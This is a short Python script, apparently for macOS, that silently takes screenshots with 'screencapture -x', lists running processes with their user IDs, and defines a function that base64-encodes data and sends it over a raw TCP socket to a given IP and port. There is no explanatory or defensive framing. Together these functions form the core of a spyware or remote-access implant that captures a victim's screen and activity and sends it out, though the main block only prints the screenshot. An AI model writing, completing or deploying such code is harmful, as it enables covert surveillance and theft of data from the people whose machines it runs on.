from io import BytesIO
from PIL import Image,ImageGrab
from base64 import b64encode
import os,subprocess,socket



def screenshot():
    os.system('/usr/sbin/screencapture -x $PWD/ss.png')
    pil = Image.open('ss.png')
    output = BytesIO()
    pil.save(output, format='PNG')
    img = output.getvalue()
    return img



def processes():
    cmd = '/bin/ps o pid,uid,command'
    processes = subprocess.check_output(cmd, shell=True)
    return processes



def send_to_server(ip, port, data):
    b64 = b64encode(data)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b64)
    s.close()



if __name__ == '__main__':
    print(screenshot())
